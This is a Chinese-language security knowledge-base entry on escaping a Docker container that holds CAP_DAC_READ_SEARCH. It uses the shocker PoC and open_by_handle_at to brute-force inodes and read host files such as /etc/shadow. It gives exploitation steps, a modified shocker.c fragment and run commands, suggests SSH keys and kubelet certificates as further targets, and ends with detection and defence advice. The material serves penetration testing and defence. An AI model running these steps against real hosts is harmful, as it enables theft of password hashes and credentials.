---
id: cloud-container-cap-dac-read-search-shocker-open-by-handle-host-file-read
title: 容器持有 CAP_DAC_READ_SEARCH 时用 shocker 爆破 inode 经 open_by_handle_at 读取宿主机任意文件（/etc/shadow）
type: scenario
domain: cloud
path: cloud/container
technique: cap-dac-read-search-open-by-handle-escape
aliases:
- CAP_DAC_READ_SEARCH
- shocker.c
- open_by_handle_at
- name_to_handle_at
- docker VM-container breakout PoC
- 容器能力逃逸
tags:
- cloud
- container
- docker
- capability
- escape
- file-read
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
affected_versions: Docker 1.0（原文「影响范围」；原文称早期 Docker 容器默认拥有 CAP_DAC_READ_SEARCH、Docker 1.0 之前对能力采用黑名单策略；复现可用任意版本 docker --cap-add=CAP_DAC_READ_SEARCH）
verification:
  verified_by: verifier-V673
  verified_at: '2026-11-13T10:33:13+08:00'
  notes: 已对照原文与图01-20核对：影响范围原文仅标 Docker 1.0，早期默认授予/黑名单策略及 --cap-add 复现备注与原文一致；shocker 改 open("/etc/hosts")、etc ino=1310721 / shadow ino=1312492、句柄字节与宿主机 /etc/shadow 输出均与图17-20一致；PoC 为原文字段，未本地复跑。
---

## 一句话结论

容器若持有 `CAP_DAC_READ_SEARCH`（早期 Docker 默认授予；也可通过 `docker run --cap-add=CAP_DAC_READ_SEARCH` 复现），攻击者可在容器内运行 shocker 类 PoC：从宿主 bind mount 进来的文件取得挂载文件句柄，再借 `open_by_handle_at(2)` 绕过目录遍历/读权限检查、爆破已知目录与文件的 inode，直接打开同文件系统上的宿主机文件（原文成功读出宿主机 `/etc/shadow`），实现容器逃逸（读）。

## 原理

- **CAP_DAC_READ_SEARCH 的语义**：该 capability 允许进程绕过文件读权限与目录搜索（traverse）权限检查；更关键的是，`open_by_handle_at(2)` 在拥有该 capability 时可以按文件句柄打开文件，而不需要路径上各级目录的可执行/读权限。
- **为什么能跨到宿主机**：容器与宿主机共享内核与文件系统；容器内 bind mount 的 `/etc/hosts`、`/etc/resolv.conf`、`/etc/hostname`（或老版本的 `/.dockerinit`）属于宿主机的文件系统。攻击者先 `open()` 这类文件得到 fd，用 `name_to_handle_at(fd, ...)` 取得该文件系统上的文件句柄结构，随后就能对同一文件系统内的 inode 使用 `open_by_handle_at()`。
- **爆破 inode**：文件句柄包含 inode 等字段（原文句柄为 8 字节：`{0x01, 0x00, 0x14, 0x00, 0x00, 0x00, 0x00, 0x00}` 形式）。不知道目标 inode 的高位/低位时，PoC 先枚举可见目录项确定已知 inode 低 32 位，再对其余 32 位做暴力尝试：每次构造句柄调用 `open_by_handle_at`，成功即命中。原文先解析 `etc`（ino=1310721）、再解析 `shadow`（ino=1312492），"Got a final handle!" 后读出 `/etc/shadow` 全文（含 root 等账户 hash）。
- **为什么是逃逸而非普通读**：路径解析本应被 chroot/namespace 限制在容器 rootfs；`open_by_handle_at` 走的是文件系统句柄而不是路径，配合宿主 bind mount 文件即可越过 mount namespace 的路径边界，读到宿主机 rootfs 中的文件。
- **历史背景**：Docker 早期对 capability 采用黑名单策略，未限制 `CAP_DAC_READ_SEARCH`，因此默认容器即可利用；现代 Docker 默认丢弃该 capability，但显式 `--cap-add`、K8s `securityContext.capabilities.add`、特权/宽松 PSP 等配置仍会重新打开该面。

## 触发条件

- 容器持有 `CAP_DAC_READ_SEARCH`（`getpcaps`/`CapEff` 可见；或 K8s securityContext 显式添加）。
- 容器与宿主机某文件系统之间有 bind mount 的宿主文件（如 `/etc/hosts`、`/etc/resolv.conf`）用于取得句柄；老版本可用 `/.dockerinit`。
- 容器内可执行编译好的 PoC（或自带 gcc）；内核支持 `open_by_handle_at` 且未被 seccomp/AppArmor 拦截。
- 仅限授权测试。

## 利用步骤

1. 确认能力：`docker top <id>`、`getpcaps <pid>` 或容器内 `cat /proc/self/status | grep CapEff`，确认包含 `CAP_DAC_READ_SEARCH`（CapEff 中对应位）。
2. 修改 shocker.c：把初始 `open("/.dockerinit", O_RDONLY)` 改为宿主 bind mount 文件，例如 `open("/etc/hosts", O_RDONLY)`（高版本 `/.dockerinit` 已不在宿主文件系统）。
3. `gcc shocker.c -o shocker` 编译，`docker cp` 进容器后执行。
4. PoC 输出 `Resolving 'etc/shadow'` → 枚举/爆破 inode → `Got a final handle!` → 打印宿主机 `/etc/shadow`；可把目标换成 `/etc/passwd`、SSH 私钥、kubelet 证书等其他已知路径。

## PoC

shocker 核心改动（原文）：

```c
// get a FS reference from something mounted in from outside
// 原版：open("/.dockerinit", O_RDONLY)
// 高版本 Docker 改为宿主 bind mount 的文件：
if ((fd1 = open("/etc/hosts", O_RDONLY)) < 0)
  die("[-] open");

if (find_handle(fd1, "/etc/shadow", &root_h, &h) <= 0)
  die("[-] Cannot find valid handle!");
printf("[!] Got a final handle!\n");
dump_handle(&h);
```

```bash
gcc shocker.c -o shocker
docker cp /home/ubuntu/shocker <container-id>:/tmp/shocker
docker exec -it <container-id> /bin/bash
/tmp/shocker
# [*] Found etc  / [*] Match: etc ino=1310721
# [*] Found shadow / [*] Match: shadow ino=1312492
# [!] Got a final handle!  -> 输出宿主机 /etc/shadow
```

原文实测成功读出宿主机 `/etc/shadow`（root、daemon、bin、sys、sync 等账户行）。

## 变体与关联

- 变体：目标路径可换任意同文件系统文件；能力也可来自 K8s Pod `securityContext.capabilities.add: ["DAC_READ_SEARCH"]` 或宽松 PSP；容器内无编译器时可静态编译后 `docker cp`。
- 关联：[[cloud-container-k8s-workload-config-escape]]（K8s 危险工作负载与 capability 逃逸总览）、[[pentest-privilege-escalation-file-capabilities-abuse]]（文件 capability 滥用，非容器场景）、[[cloud-container-docker-devices-allow-mknod-debugfs-escape]]（另一类 capability/设备逃逸）。
- 边界：现代 Docker 默认 drop 该 capability；seccomp 默认配置可能拦截 `open_by_handle_at`；无宿主 bind mount 文件或目标不在同一文件系统时无法取得有效句柄。

## 检测与防御

- **防御**：不要授予容器 `CAP_DAC_READ_SEARCH`；使用非 root 用户与 user namespace；启用 AppArmor/SELinux/seccomp 限制 `open_by_handle_at`/`name_to_handle_at`；避免把宿主机文件 bind mount 进不可信容器；K8s 使用 PodSecurity 限制 capabilities。
- **检测**：容器内出现 `getpcaps`/CapEff 探测、`shocker` 类二进制；审计日志出现大量 `open_by_handle_at` 失败/成功（如 auditd 规则 `-a always -S open_by_handle_at`）；容器读取 `/etc/shadow`、宿主 SSH 私钥等敏感文件。
- **注意**：该能力使"读任意文件"成立，配合可写文件系统或后续提权可进一步扩大；在失陷容器上应视为高危信号。
